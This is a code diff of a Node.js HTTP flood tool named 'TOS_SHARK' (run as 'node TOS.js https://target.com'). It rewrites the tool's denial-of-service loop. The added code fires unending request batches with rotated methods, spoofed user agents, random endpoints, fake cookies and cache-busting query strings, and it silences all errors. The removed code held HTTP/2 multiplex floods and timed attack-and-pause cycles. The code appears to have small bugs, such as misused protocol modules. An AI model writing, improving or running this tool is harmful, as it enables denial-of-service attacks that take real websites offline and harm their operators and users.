@@ -12,8 +12,9 @@ class TOS_SHARK {
         this.running = true;
         this.attackActive = false;
         this.totalReqs = 0;
-        this.reqCounter = 0;
+        this.startTime = Date.now();
         this.lastLog = Date.now();
+        this.reqCounter = 0;
         this.attackStart = 0;
         this.breakStart = 0;
         this.currentMethod = '';
@@ -21,288 +22,222 @@ class TOS_SHARK {
         // Attack methods pool
         this.methods = ['H2-MULTIPLEX', 'ENDPOINT-HOPPING', 'COOKIE-SESSION'];
         
-        // Data pools - KEEP SMALL
-        this.userAgents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-            'curl/7.88.1',
-            'Go-http-client/2.0',
-            'python-requests/2.28.2'
-        ];
-        
-        // Method rotation pool
+        // Data pools
+        this.userAgents = this.generateUserAgents();
+        this.endpoints = this.generateEndpoints();
+        this.cookies = this.generateCookies();
         this.methodsPool = ['GET', 'HEAD', 'POST', 'OPTIONS'];
         
-        // Start immediately
-        this.startCycle();
+        // Multiple targets pattern (2x URL, 1x URL pattern)
+        this.targetVariants = this.generateTargetVariants(url);
+        this.targetPatternIndex = 0;
+        
+        // Print header once
+        console.log(`TØS-SHARK | *.* | MT-3M22`);
+        console.log('-----------------------------------------------------------------');
+        
+        // Start immediately without warmup
+        this.attackLoop();
+    }
+
+    // ===== TARGET RANDOMIZATION =====
+    generateTargetVariants(baseUrl) {
+        const variants = [];
+        // Create 3 different path variations
+        for (let i = 0; i < 3; i++) {
+            const variant = new URL(baseUrl);
+            // Add random query params to vary cache
+            variant.search = `?v=${Date.now()}_${i}`;
+            variants.push(variant);
+        }
+        return variants;
+    }
+
+    getNextTarget() {
+        // Pattern: 2x URL A, 1x URL B, 2x URL A, 1x URL C, repeat
+        const pattern = [0, 0, 1, 0, 0, 2];
+        const idx = pattern[this.targetPatternIndex % pattern.length];
+        this.targetPatternIndex++;
+        return this.targetVariants[idx];
     }
 
     // ===== DATA GENERATORS =====
-    generateRoutes() {
+    generateUserAgents() {
+        return [
+            'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 12; SM-F926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/537.36'
+        ];
+    }
+
+    generateEndpoints() {
+        const base = ['/', '/api', '/v1', '/v2', '/static', '/assets', '/data', '/json'];
         const patterns = [];
-        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
         
-        // Generate 30 random patterns
-        for (let i = 0; i < 30; i++) {
-            const length = 3 + Math.floor(Math.random() * 10);
-            let path = '/';
-            for (let j = 0; j < length; j++) {
-                path += chars[Math.floor(Math.random() * chars.length)];
-            }
-            if (Math.random() > 0.7) {
-                const exts = ['.js', '.css', '.json', '.xml', '.html', '.php', '.asp'];
-                path += exts[Math.floor(Math.random() * exts.length)];
+        // Generate random patterns like /api/v1/users/12345
+        for (let i = 0; i < 20; i++) {
+            const depth = Math.floor(Math.random() * 4) + 1;
+            let path = '';
+            for (let d = 0; d < depth; d++) {
+                const segments = ['users', 'products', 'items', 'data', 'files', 'images', 'docs', 'api'];
+                const randSeg = segments[Math.floor(Math.random() * segments.length)];
+                path += `/${randSeg}`;
+                
+                // 30% chance to add ID
+                if (Math.random() < 0.3) {
+                    path += `/${Math.floor(Math.random() * 10000) + 1000}`;
+                }
             }
             patterns.push(path);
         }
         
-        // Add some common patterns
-        patterns.push('/', '/api', '/static', '/data', '/v1', '/v2', '/admin', '/users', '/wp-admin', '/wp-login.php');
-        return patterns;
+        return [...base, ...patterns];
     }
 
     generateCookies() {
         const cookies = [];
-        for (let i = 0; i < 15; i++) {
-            cookies.push(`session=${Math.random().toString(36).substr(2, 16)}; token=${Math.random().toString(36).substr(2, 12)}`);
+        for (let i = 0; i < 20; i++) { // Reduced from 50
+            cookies.push({
+                session: `s${Math.random().toString(36).substr(2, 12)}`,
+                token: `t${Math.random().toString(36).substr(2, 8)}`,
+                userId: Math.floor(Math.random() * 10000)
+            });
         }
         return cookies;
     }
 
-    // ===== CYCLE MANAGEMENT =====
-    async startCycle() {
-        // Generate routes once
-        this.routes = this.generateRoutes();
-        this.cookies = this.generateCookies();
-        
-        // Initial request
-        await this.sendRandomizedRequest(true);
-        await this.sleep(200);
-        
-        // Warmup
-        const warmupCount = 500 + Math.floor(Math.random() * 100);
-        for (let i = 0; i < warmupCount; i++) {
-            await this.sendRandomizedRequest();
-            if (i % 100 === 0) await this.sleep(1);
-        }
-        
-        // Main attack loop
-        this.attackLoop();
-    }
-
+    // ===== MAIN LOOP =====
     async attackLoop() {
+        let requestBatch = 0;
+        
         while (this.running) {
-            const now = Date.now();
-            
-            if (this.attackActive) {
-                // Attack phase (20-30 minutes)
-                if (now - this.attackStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
-                    this.startBreak();
-                    continue;
-                }
-                
-                // Execute attack
-                this.executeAttackMethod().catch(() => {});
-                
-            } else {
-                // Break phase (5-10 minutes)
-                if (now - this.breakStart >= (5 * 60000) + Math.random() * (5 * 60000)) {
-                    this.startAttack();
-                    continue;
-                }
-                
-                // Light requests during break
+            // Send batch of requests
+            for (let i = 0; i < 100; i++) {
+                if (!this.running) break;
                 await this.sendRandomizedRequest();
-                await this.sleep(1000);
-            }
-            
-            // Log every 10s
-            if (now - this.lastLog >= 10000) {
-                this.lastLog = now;
-            }
-            
-            // Tiny sleep to prevent blocking
-            await this.sleep(0.01);
-        }
-    }
-
-    startAttack() {
-        this.attackActive = true;
-        this.attackStart = Date.now();
-        this.currentMethod = this.methods[Math.floor(Math.random() * this.methods.length)];
-    }
-
-    startBreak() {
-        this.attackActive = false;
-        this.breakStart = Date.now();
-        // Refresh data during break
-        this.routes = this.generateRoutes();
-        this.cookies = this.generateCookies();
-    }
-
-    // ===== ATTACK METHODS =====
-    async executeAttackMethod() {
-        switch (this.currentMethod) {
-            case 'H2-MULTIPLEX':
-                await this.attackH2Multiplex();
-                break;
-            case 'ENDPOINT-HOPPING':
-                await this.sendRandomizedRequest();
-                break;
-            case 'COOKIE-SESSION':
-                await this.sendRandomizedRequest();
-                break;
-        }
-    }
-
-    async attackH2Multiplex() {
-        try {
-            const client = http2.connect(this.target, { maxSessionMemory: 1000 });
-            
-            for (let i = 0; i < 30; i++) {
-                this.sendH2Request(client);
                 this.totalReqs++;
                 this.reqCounter++;
+                requestBatch++;
+                
+                // Log every 10 seconds
+                const now = Date.now();
+                if (now - this.lastLog >= 10000) {
+                    this.lastLog = now;
+                    console.log(`2M22:${this.reqCounter} --> ${this.lastStatus || 0}`);
+                }
             }
             
-            setTimeout(() => {
-                client.destroy();
-                client.close();
-            }, 50).unref();
+            // Small delay between batches to prevent GC pressure
+            await this.sleep(1);
             
-        } catch (err) {
-            // Silent
+            // Clean up every 1000 requests
+            if (requestBatch >= 1000) {
+                this.cleanup();
+                requestBatch = 0;
+            }
         }
     }
 
-    // ===== CORE REQUEST FUNCTION =====
-    async sendRandomizedRequest(isInitial = false) {
+    // ===== RANDOMIZED REQUEST =====
+    async sendRandomizedRequest() {
+        const targetUrl = this.getNextTarget();
+        const method = this.methodsPool[Math.floor(Math.random() * this.methodsPool.length)];
+        const endpoint = this.endpoints[Math.floor(Math.random() * this.endpoints.length)];
+        const userAgent = this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
+        
+        // Build path with random pattern
+        const fullPath = endpoint + (Math.random() > 0.5 ? `?r=${Math.random().toString(36).substr(2, 8)}` : '');
+        
+        const options = {
+            hostname: targetUrl.hostname,
+            path: fullPath,
+            method: method,
+            headers: {
+                'User-Agent': userAgent,
+                'Connection': 'close',
+                'Accept': '*/*',
+                'Accept-Encoding': 'gzip, deflate',
+                'Cache-Control': 'no-cache'
+            },
+            timeout: 8000,
+            agent: false // Prevent connection pooling
+        };
+        
+        // Add random headers based on method
+        if (method === 'POST') {
+            options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+            options.headers['Content-Length'] = '15';
+        }
+        
+        // Add random cookie sometimes
+        if (Math.random() > 0.7) {
+            const cookie = this.cookies[Math.floor(Math.random() * this.cookies.length)];
+            options.headers['Cookie'] = `session=${cookie.session}; token=${cookie.token}`;
+        }
+        
         return new Promise((resolve) => {
-            // ROTATE: Method
-            const method = this.methodsPool[Math.floor(Math.random() * this.methodsPool.length)];
-            
-            // ROTATE: UA
-            const userAgent = this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
-            
-            // ROTATE: Route
-            const route = this.routes[Math.floor(Math.random() * this.routes.length)];
-            
-            const options = {
-                hostname: this.host,
-                path: route,
-                method: method,
-                headers: {
-                    'User-Agent': userAgent,
-                    'Connection': 'close',
-                    'Accept': '*/*',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                },
-                timeout: 7000,
-                agent: false
-            };
-            
-            // Add cookies 40% of the time
-            if (Math.random() > 0.6) {
-                options.headers['Cookie'] = this.cookies[Math.floor(Math.random() * this.cookies.length)];
-            }
-            
-            if (method === 'POST') {
-                options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
-                options.headers['Content-Length'] = '7';
-            }
-            
-            const req = (this.isHttps ? https : http).request(options, (res) => {
-                const status = res.statusCode;
+            const protocol = targetUrl.protocol === 'https:' ? https : http2;
+            const req = protocol.request(options, (res) => {
+                this.lastStatus = res.statusCode;
+                res.on('data', () => {}); // Drain data
+                res.on('end', resolve);
                 res.destroy();
-                this.logStatus(status);
-                resolve();
             });
             
             req.on('error', () => {
-                this.logStatus('ERR');
+                this.lastStatus = 'ERR';
                 resolve();
             });
             
             req.on('timeout', () => {
                 req.destroy();
-                this.logStatus('TIMEOUT');
+                this.lastStatus = 'TIMEOUT';
                 resolve();
             });
             
             if (method === 'POST') {
-                req.write('data=aa');
+                req.write('data=random');
             }
             
             req.end();
-            
-            if (!isInitial) {
-                this.totalReqs++;
-                this.reqCounter++;
-            }
         });
     }
 
-    sendH2Request(client) {
-        try {
-            const route = this.routes[Math.floor(Math.random() * this.routes.length)];
-            const method = this.methodsPool[Math.floor(Math.random() * this.methodsPool.length)];
-            const userAgent = this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
-            
-            const req = client.request({
-                ':method': method,
-                ':path': route,
-                ':authority': this.host,
-                'user-agent': userAgent
-            });
-            
-            req.on('response', (headers) => {
-                this.logStatus(headers[':status']);
-                req.destroy();
-            });
-            
-            req.on('error', () => {
-                this.logStatus('ERR');
-                req.destroy();
-            });
-            
-            req.setTimeout(5000, () => {
-                req.destroy();
-                this.logStatus('TIMEOUT');
-            });
-            
-            req.end();
-        } catch (err) {
-            this.logStatus('ERR');
+    // ===== CLEANUP =====
+    cleanup() {
+        // Force garbage collection if available
+        if (global.gc) {
+            global.gc();
         }
-    }
-
-    // ===== LOGGING =====
-    logStatus(status) {
-        const now = Date.now();
-        if (now - this.lastLog >= 10000) {
-            this.lastLog = now;
-            // ONLY THIS LOG: 2M22:(request number) ---> (REAL Status Code)
-            console.log(`2M22:${this.reqCounter} ---> ${status}`);
+        
+        // Rotate small subset of data to prevent memory growth
+        if (Math.random() > 0.8) {
+            this.userAgents = this.generateUserAgents();
         }
+        
+        // Clear any large arrays
+        this.endpoints.length = Math.min(this.endpoints.length, 30);
+        this.cookies.length = Math.min(this.cookies.length, 20);
     }
 
     // ===== UTILS =====
     sleep(ms) {
-        return new Promise(resolve => {
-            const timer = setTimeout(resolve, ms);
-            if (timer.unref) timer.unref();
-        });
+        return new Promise(resolve => setTimeout(resolve, ms));
     }
 }
 
-const http = require('http');
-
 // Run
 if (require.main === module) {
+    // Minimal error handling
     process.on('uncaughtException', () => {});
     process.on('unhandledRejection', () => {});
     
     if (process.argv.length < 3) {
+        console.log('Usage: node TOS.js https://target.com');
         process.exit(1);
     }
     
